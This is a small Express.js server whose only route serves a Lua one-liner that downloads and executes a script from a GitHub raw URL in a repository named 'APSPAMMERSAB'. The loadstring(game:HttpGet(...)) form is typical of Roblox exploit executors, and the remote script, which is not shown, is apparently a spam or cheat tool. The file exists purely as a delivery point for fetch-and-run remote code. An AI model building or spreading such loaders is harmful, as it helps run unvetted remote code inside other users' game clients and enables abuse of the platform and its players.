const express = require("express");
const app = express();
const port = process.env.PORT || 3000;

app.get("/", (req, res) => {
  const luaScript = `loadstring(game:HttpGet("https://raw.githubusercontent.com/plantapi662-lab/APSPAMMERSAB/refs/heads/main/W"))()`;
  res.type("text/plain");
  res.send(luaScript);
});

app.listen(port, () => console.log("Server running on port " + port));
